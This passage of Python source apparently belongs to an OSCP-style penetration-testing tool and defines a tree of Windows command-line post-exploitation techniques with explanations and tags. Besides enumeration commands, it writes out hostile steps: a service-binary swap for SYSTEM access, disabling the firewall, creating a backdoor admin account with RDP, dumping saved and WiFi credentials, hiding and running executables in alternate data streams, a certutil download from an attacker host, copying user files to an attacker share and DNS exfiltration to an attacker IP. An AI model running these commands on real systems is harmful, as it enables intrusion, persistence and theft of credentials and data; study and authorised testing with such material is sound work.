                                    'Get-DnsClientCache (PowerShell)',
                                    'Manual: type C:\\Windows\\System32\\drivers\\etc\\hosts'
                                ],
                                'tags': ['OSCP:MEDIUM', 'ENUM', 'NETWORK']
                            }
                        },
                        {
                            'id': f'net-view-{target}',
                            'name': 'List Network Computers (net view)',
                            'type': 'command',
                            'metadata': {
                                'command': 'net view',
                                'description': 'List computers in current domain or workgroup',
                                'flag_explanations': {
                                    'net view': 'List computers',
                                    'net view \\\\<computer> /ALL': 'List shares on specific computer',
                                    'net view /domain:<domain>': 'List computers in specific domain'
                                },
                                'success_indicators': [
                                    'Computer list displayed',
                                    'Server names visible'
                                ],
                                'next_steps': [
                                    'net view \\\\<computer> /ALL (list shares)',
                                    'net use x: \\\\<computer>\\<share> (mount share)',
                                    'Enumerate each computer for shares and permissions'
                                ],
                                'alternatives': [
                                    'dsquery computer',
                                    'Get-ADComputer -Filter * (PowerShell AD)'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'LATERAL_MOVEMENT']
                            }
                        }
                    ]
                },

                # File Operations
                {
                    'id': f'cmd-file-ops-{target}',
                    'name': 'File Operations',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'dir-hidden-{target}',
                            'name': 'List Files (Including Hidden)',
                            'type': 'command',
                            'metadata': {
                                'command': 'dir /a:h C:\\',
                                'description': 'List files including hidden and system files',
                                'flag_explanations': {
                                    'dir': 'List directory contents',
                                    '/a:h': 'Show hidden files',
                                    '/s': 'Recursive search',
                                    '/b': 'Bare format (no headers)'
                                },
                                'success_indicators': [
                                    'Hidden files visible',
                                    'System files displayed'
                                ],
                                'next_steps': [
                                    'dir /s /b C:\\ (recursive bare list)',
                                    'Look for sensitive files (passwords, keys, configs)',
                                    'Check Recycle Bin: dir C:\\$Recycle.Bin /s /b'
                                ],
                                'alternatives': [
                                    'Get-ChildItem -Force (PowerShell)',
                                    'attrib command to show/modify attributes'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'FILE_OPS']
                            }
                        },
                        {
                            'id': f'type-cat-{target}',
                            'name': 'Display File Contents (type)',
                            'type': 'command',
                            'metadata': {
                                'command': 'type C:\\path\\to\\file.txt',
                                'description': 'Display contents of text file (CMD equivalent of cat)',
                                'flag_explanations': {
                                    'type': 'Display file contents',
                                    'more': 'Display file with pagination'
                                },
                                'success_indicators': [
                                    'File contents displayed'
                                ],
                                'alternatives': [
                                    'more < file.txt (paginated)',
                                    'Get-Content file.txt (PowerShell)',
                                    'notepad file.txt (GUI)'
                                ],
                                'tags': ['OSCP:HIGH', 'FILE_OPS', 'QUICK_WIN']
                            }
                        },
                        {
                            'id': f'icacls-{target}',
                            'name': 'File Permissions (icacls)',
                            'type': 'command',
                            'metadata': {
                                'command': 'icacls "C:\\Program Files"',
                                'description': 'Display or modify file/folder permissions',
                                'flag_explanations': {
                                    'icacls': 'Display/modify ACLs (Access Control Lists)',
                                    '/grant': 'Grant permissions',
                                    '/t': 'Recursive',
                                    '/e': 'Edit (keep existing permissions)'
                                },
                                'notes': '''
Privilege Escalation:
1. icacls "C:\\Program Files\\App\\service.exe" (check permissions)
2. If writable by current user: Replace with malicious binary
3. Restart service to execute payload as SYSTEM

Grant full control:
icacls <FILE_PATH> /t /e /p <USERNAME>:F
''',
                                'alternatives': [
                                    'Get-Acl C:\\Path | Format-List (PowerShell)',
                                    'accesschk.exe -wvu "C:\\Program Files" (Sysinternals)'
                                ],
                                'tags': ['OSCP:HIGH', 'PRIVESC', 'FILE_OPS']
                            }
                        },
                        {
                            'id': f'attrib-{target}',
                            'name': 'File Attributes (attrib)',
                            'type': 'command',
                            'metadata': {
                                'command': 'attrib +h file.txt',
                                'description': 'Hide files or change attributes',
                                'flag_explanations': {
                                    'attrib': 'Display or change file attributes',
                                    '+h': 'Set hidden attribute',
                                    '-h': 'Remove hidden attribute',
                                    '+s': 'Set system attribute',
                                    '+r': 'Set read-only'
                                },
                                'success_indicators': [
                                    'Attribute changed successfully'
                                ],
                                'alternatives': [
                                    'Set-ItemProperty -Path file.txt -Name Attributes -Value Hidden (PowerShell)'
                                ],
                                'tags': ['OSCP:MEDIUM', 'FILE_OPS', 'STEALTH']
                            }
                        },
                        {
                            'id': f'xcopy-recursive-{target}',
                            'name': 'Recursive Copy (xcopy)',
                            'type': 'command',
                            'metadata': {
                                'command': 'xcopy /hievry C:\\Users\\security\\ \\\\<LHOST>\\share\\',
                                'description': 'Copy files recursively (including hidden, to SMB share)',
                                'flag_explanations': {
                                    'xcopy': 'Extended copy utility',
                                    '/h': 'Copy hidden and system files',
                                    '/i': 'Assume destination is directory',
                                    '/e': 'Copy directories and subdirectories (including empty)',
                                    '/v': 'Verify each file',
                                    '/r': 'Overwrite read-only files',
                                    '/y': 'Suppress overwrite confirmation'
                                },
                                'alternatives': [
                                    'robocopy source dest /E /ZB (robust copy)',
                                    'Copy-Item -Recurse (PowerShell)'
                                ],
                                'tags': ['OSCP:MEDIUM', 'FILE_OPS', 'EXFIL']
                            }
                        }
                    ]
                },

                # Firewall & RDP
                {
                    'id': f'cmd-firewall-rdp-{target}',
                    'name': 'Firewall & Remote Desktop',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'firewall-show-{target}',
                            'name': 'Show Firewall Status',
                            'type': 'command',
                            'metadata': {
                                'command': 'netsh firewall show state',
                                'description': 'Display firewall status and open ports',
                                'flag_explanations': {
                                    'netsh firewall': 'Legacy firewall commands (pre-Vista)',
                                    'netsh advfirewall': 'Advanced firewall (Vista+)',
                                    'show state': 'Display current firewall configuration'
                                },
                                'success_indicators': [
                                    'Firewall status displayed',
                                    'Open ports visible'
                                ],
                                'alternatives': [
                                    'netsh advfirewall firewall show rule name=all',
                                    'Get-NetFirewallRule (PowerShell)'
                                ],
                                'tags': ['OSCP:MEDIUM', 'ENUM', 'NETWORK']
                            }
                        },
                        {
                            'id': f'firewall-disable-{target}',
                            'name': 'Disable Firewall (Requires Admin)',
                            'type': 'command',
                            'metadata': {
                                'command': 'NetSh Advfirewall set allprofiles state off',
                                'description': 'Disable Windows Firewall (all profiles)',
                                'flag_explanations': {
                                    'NetSh Advfirewall': 'Advanced firewall configuration',
                                    'set allprofiles state off': 'Disable all firewall profiles (Domain, Private, Public)'
                                },
                                'notes': 'Requires administrator privileges. VERY NOISY - triggers security alerts.',
                                'alternatives': [
                                    'netsh firewall set opmode disable (legacy)',
                                    'Set-NetFirewallProfile -All -Enabled False (PowerShell)'
                                ],
                                'tags': ['OSCP:LOW', 'NOISY', 'REQUIRES_ADMIN']
                            }
                        },
                        {
                            'id': f'firewall-add-rule-{target}',
                            'name': 'Add Firewall Rule',
                            'type': 'command',
                            'metadata': {
                                'command': 'netsh advfirewall firewall add rule name="Open Port 4444" dir=in action=allow protocol=TCP localport=4444',
                                'description': 'Create firewall rule to allow inbound traffic on specific port',
                                'flag_explanations': {
                                    'add rule': 'Create new firewall rule',
                                    'name="..."': 'Rule name',
                                    'dir=in': 'Direction: inbound',
                                    'action=allow': 'Allow traffic',
                                    'protocol=TCP': 'Protocol type',
                                    'localport=4444': 'Port number'
                                },
                                'alternatives': [
                                    'netsh firewall add portopening TCP 4444 "Open Port 4444"',
                                    'New-NetFirewallRule (PowerShell)'
                                ],
                                'tags': ['OSCP:MEDIUM', 'NETWORK', 'REQUIRES_ADMIN']
                            }
                        },
                        {
                            'id': f'enable-rdp-{target}',
                            'name': 'Enable Remote Desktop',
                            'type': 'command',
                            'metadata': {
                                'command': 'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh firewall add portopening TCP 3389 "Remote Desktop"',
                                'description': 'Enable RDP and open firewall port 3389',
                                'flag_explanations': {
                                    'reg add': 'Add registry key',
                                    'fDenyTSConnections': 'Registry value controlling RDP (0=enabled, 1=disabled)',
                                    '/t REG_DWORD': 'Value type',
                                    '/d 0': 'Data (0 = allow connections)',
                                    '/f': 'Force overwrite'
                                },
                                'notes': '''
Full RDP Setup:
1. Enable RDP: reg add ... /v fDenyTSConnections ... /d 0 /f
2. Open firewall: netsh firewall add portopening TCP 3389 "Remote Desktop"
3. (Optional) Add user: net user hacker P@ssw0rd /add
4. (Optional) Add to RDP group: net localgroup "Remote Desktop Users" hacker /add
5. Connect: xfreerdp /u:hacker /p:P@ssw0rd /v:<TARGET>:3389
''',
                                'alternatives': [
                                    'wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"',
                                    'Set-ItemProperty -Path "HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server" -Name fDenyTSConnections -Value 0 (PowerShell)'
                                ],
                                'tags': ['OSCP:MEDIUM', 'PERSISTENCE', 'REQUIRES_ADMIN', 'NOISY']
                            }
                        }
                    ]
                },

                # Credentials & Persistence
                {
                    'id': f'cmd-credentials-{target}',
                    'name': 'Credentials & Persistence',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'cmdkey-list-{target}',
                            'name': 'List Saved Credentials (cmdkey)',
                            'type': 'command',
                            'metadata': {
                                'command': 'cmdkey /list',
                                'description': 'List stored credentials (Credential Manager)',
                                'flag_explanations': {
                                    'cmdkey /list': 'Display stored credentials',
                                    'runas /savecred': 'Use saved credentials to run command'
                                },
                                'success_indicators': [
                                    'Stored credentials displayed',
                                    'Target names visible'
                                ],
                                'next_steps': [
                                    'runas /savecred /user:<USER> "cmd.exe" (use saved creds)',
                                    'vaultcmd /listcreds:"Windows Credentials" /all (Windows Vault)'
                                ],
                                'alternatives': [
                                    'vaultcmd /listcreds:"Windows Credentials" /all',
                                    'Get-StoredCredential (PowerShell)'
                                ],
                                'tags': ['OSCP:HIGH', 'CREDENTIAL_THEFT', 'QUICK_WIN']
                            }
                        },
                        {
                            'id': f'wifi-passwords-{target}',
                            'name': 'Dump WiFi Passwords',
                            'type': 'command',
                            'metadata': {
                                'command': 'netsh wlan show profile',
                                'description': 'List WiFi profiles, then dump passwords',
                                'flag_explanations': {
                                    'netsh wlan show profile': 'List WiFi profiles',
                                    'netsh wlan show profile <SSID> key=clear': 'Show password in cleartext'
                                },
                                'notes': '''
Workflow:
1. netsh wlan show profile (list WiFi networks)
2. netsh wlan show profile <SSID> key=clear (dump password)

Example:
netsh wlan show profile "CompanyWiFi" key=clear
Look for "Key Content" field
''',
                                'alternatives': [
                                    'PowerShell: (netsh wlan show profile <SSID> key=clear) | Select-String "Key Content"'
                                ],
                                'tags': ['OSCP:HIGH', 'CREDENTIAL_THEFT', 'QUICK_WIN']
                            }
                        },
                        {
                            'id': f'add-user-{target}',
                            'name': 'Create Local Admin User',
                            'type': 'command',
                            'metadata': {
                                'command': 'net user hacker P@ssw0rd /add && net localgroup Administrators hacker /add',
                                'description': 'Create new user and add to Administrators group (persistence)',
                                'flag_explanations': {
                                    'net user <username> <password> /add': 'Create new local user',
                                    'net localgroup Administrators <username> /add': 'Add user to Administrators group'
                                },
                                'notes': '''
Full Persistence Setup:
1. net user hacker P@ssw0rd /add
2. net localgroup Administrators hacker /add
3. net localgroup "Remote Desktop Users" hacker /add
4. Enable RDP (see RDP section)
5. Connect remotely

OPSEC: Very noisy - creates event logs and visible user account
''',
                                'alternatives': [
                                    'New-LocalUser and Add-LocalGroupMember (PowerShell)',
                                    'Domain: net user hacker P@ssw0rd /ADD /DOMAIN'
                                ],
                                'tags': ['OSCP:HIGH', 'PERSISTENCE', 'REQUIRES_ADMIN', 'NOISY']
                            }
                        }
                    ]
                },

                # Alternate Data Streams
                {
                    'id': f'cmd-ads-{target}',
                    'name': 'Alternate Data Streams (ADS)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'ads-create-{target}',
                            'name': 'Hide Data in ADS',
                            'type': 'command',
                            'metadata': {
                                'command': 'type C:\\temp\\evil.exe > "C:\\Program Files\\App\\log.txt:hidden.exe"',
                                'description': 'Hide executable in Alternate Data Stream of innocent file',
                                'flag_explanations': {
                                    'type file >': 'Redirect file contents',
                                    'file.txt:ads.exe': 'Create ADS named "ads.exe" attached to file.txt'
                                },
                                'notes': '''
ADS allows hiding data in NTFS file metadata

Examples:
- Hide executable: type evil.exe > log.txt:hidden.exe
- Hide text: echo "secret" > file.txt:secret.txt
- Execute from ADS: wmic process call create "C:\\log.txt:hidden.exe"
''',
                                'alternatives': [
                                    'certutil.exe -urlcache -f http://attacker/evil.exe file.txt:hidden.exe',
                                    'PowerShell: Set-Content -Path file.txt -Stream hidden.exe -Value (Get-Content evil.exe -Raw)'
                                ],
                                'tags': ['OSCP:MEDIUM', 'STEALTH', 'EVASION']
                            }
                        },
                        {
                            'id': f'ads-detect-{target}',
                            'name': 'Detect ADS',
                            'type': 'command',
                            'metadata': {
                                'command': 'dir /R C:\\path',
                                'description': 'List files and their Alternate Data Streams',
                                'flag_explanations': {
                                    'dir /R': 'Show ADS attached to files'
                                },
                                'success_indicators': [
                                    'ADS displayed after filename',
                                    'Format: filename:adsname:$DATA'
                                ],
                                'alternatives': [
                                    'streams.exe C:\\path (Sysinternals)',
                                    'Get-Item file.txt -Stream * (PowerShell)'
                                ],
                                'tags': ['OSCP:MEDIUM', 'ENUM', 'STEALTH']
                            }
                        },
                        {
                            'id': f'ads-execute-{target}',
                            'name': 'Execute from ADS',
                            'type': 'command',
                            'metadata': {
                                'command': 'wmic process call create "C:\\Program Files\\App\\log.txt:hidden.exe"',
                                'description': 'Execute executable stored in Alternate Data Stream',
                                'flag_explanations': {
                                    'wmic process call create': 'Create new process',
                                    '"file.txt:hidden.exe"': 'Path to ADS executable'
                                },
                                'alternatives': [
                                    'PowerShell: Start-Process "file.txt:hidden.exe"',
                                    'Extract first: expand file.txt:hidden.exe C:\\temp\\evil.exe'
                                ],
                                'tags': ['OSCP:MEDIUM', 'STEALTH', 'EVASION']
                            }
                        }
                    ]
                },

                # Miscellaneous
                {
                    'id': f'cmd-misc-{target}',
                    'name': 'Miscellaneous Techniques',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'runas-savecred-{target}',
                            'name': 'Run As (runas)',
                            'type': 'command',
                            'metadata': {
                                'command': 'runas /savecred /user:WORKGROUP\\Administrator "cmd.exe"',
                                'description': 'Run command as different user with saved credentials',
                                'flag_explanations': {
                                    'runas': 'Run program as different user',
                                    '/savecred': 'Use saved credentials (no password prompt)',
                                    '/user:DOMAIN\\user': 'User to impersonate',
                                    '/netonly': 'Credentials for network access only'
                                },
                                'notes': '''
Usage:
- runas /savecred /user:ADMIN "cmd.exe" (if credentials saved)
- runas /netonly /user:DOMAIN\\user "cmd.exe" (prompts for password, network impersonation)
''',
                                'alternatives': [
                                    'Start-Process -Credential (Get-Credential) (PowerShell)',
                                    'PsExec.exe -u DOMAIN\\user -p password cmd.exe'
                                ],
                                'tags': ['OSCP:MEDIUM', 'LATERAL_MOVEMENT']
                            }
                        },
                        {
                            'id': f'reg-query-{target}',
                            'name': 'Registry Query',
                            'type': 'command',
                            'metadata': {
                                'command': 'reg query HKEY_LOCAL_MACHINE\\SOFTWARE',
                                'description': 'Query Windows Registry keys',
                                'flag_explanations': {
                                    'reg query': 'Query registry',
                                    'reg add': 'Add registry key/value',
                                    '/s': 'Recursive',
                                    '/v': 'Specific value name'
                                },
                                'notes': '''
Useful Queries:
- Installed software: reg query HKEY_LOCAL_MACHINE\\SOFTWARE
- Autorun: reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
- SNMP community strings: reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s
- AlwaysInstallElevated: reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
''',
                                'alternatives': [
                                    'Get-ItemProperty (PowerShell)',
                                    'regedit (GUI)'
                                ],
                                'tags': ['OSCP:HIGH', 'ENUM', 'PRIVESC']
                            }
                        },
                        {
                            'id': f'dnsquery-shell-{target}',
                            'name': 'DNS Exfiltration (for /f)',
                            'type': 'command',
                            'metadata': {
                                'command': 'for /f %a in (\'whoami\') do nslookup %a <ATTACKER_IP>',
                                'description': 'Exfiltrate command output via DNS queries (manual C2)',
                                'flag_explanations': {
                                    'for /f': 'Loop through command output',
                                    '%a': 'Variable (use %%a in batch scripts)',
                                    'nslookup %a <IP>': 'Send output as DNS query'
                                },
                                'notes': '''
Advanced DNS Exfiltration:
for /f "tokens=1,2,3" %a in ('dir /B C:\\') do nslookup %a.%b.%c <ATTACKER_IP>

Listener (Attacker):
- sudo responder -I eth0 (active)
- sudo tcpdump -i eth0 -A proto udp and dst port 53 (passive)
''',
                                'alternatives': [
                                    'PowerShell: Invoke-DNSExfiltrator',
                                    'dnscat2 (full DNS tunnel)'
                                ],
                                'tags': ['OSCP:LOW', 'EXFIL', 'STEALTH', 'MANUAL']
                            }
                        }
                    ]
                }
            ]
        }
